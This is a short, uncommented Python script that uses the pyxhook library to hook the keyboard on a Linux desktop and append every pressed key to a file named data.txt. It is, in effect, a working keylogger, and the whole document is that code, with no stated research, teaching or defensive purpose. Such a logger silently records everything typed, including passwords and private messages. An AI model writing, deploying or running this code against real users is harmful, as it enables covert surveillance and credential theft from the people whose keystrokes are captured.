#!/usr/bin/env python
import pyxhook
store = open("data.txt","a+")
def Onkeypress(event):
    temp = event.Key
    store.write(temp+"\n")

hm = pyxhook.HookManager()
hm.KeyDown = Onkeypress
hm.HookKeyboard()
hm.start()
